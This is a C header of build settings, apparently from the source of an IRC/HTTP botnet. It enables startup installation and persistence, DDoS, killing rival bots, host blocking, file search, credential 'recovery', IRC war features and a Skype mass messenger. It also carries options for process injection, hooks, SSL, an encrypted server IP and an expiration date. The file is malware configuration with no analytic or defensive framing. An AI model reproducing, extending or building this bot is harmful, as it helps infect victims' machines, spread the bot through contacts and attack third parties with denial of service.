/* <------------------------------> Settings START <------------------------------> */
//#define DEBUG //(installation, injection, persistence, download&execute/update all disabled when DEBUG is defined)
#define HTTP_BUILD

//#define BOTKILL_ON_START
//#define BOTKILL_ONCE //(if this is undefind and BOTKILL_ON_START is defined, persistent botkilling is activated on start)

//#define USE_SSL
//#define USE_ENCRYPTED_IP
//#define SILENT_BY_DEFAULT //(channel mode +M works fine as an alternative)

#define INCLUDE_STARTUP_INSTALLATION_AND_PERSISTANCE //(recommended)
#define INCLUDE_DDOS
#define INCLUDE_BOTKILL
#define INCLUDE_HOSTBLOCK
#define INCLUDE_FILESEARCH
#define INCLUDE_VISIT
#define INCLUDE_IRCWAR
#define INCLUDE_RECOVERY
#define INCLUDE_SKYPE_MASS_MESSENGER

#define INCLUDE_LOCK
//#define INCLUDE_SOCKS4

//#define INCLUDE_INJECTION //(if undefined, the sister process method will be used for persistence instead)
//#define INCLUDE_HOOKS //(INCLUDE_INJECTION must be defined for this to be activated)
/* <------------------------------> Settings STOP <------------------------------> */

#define EXPIRATION_MEDIAN 140615
#define EXPIRATION_CUSHION 10
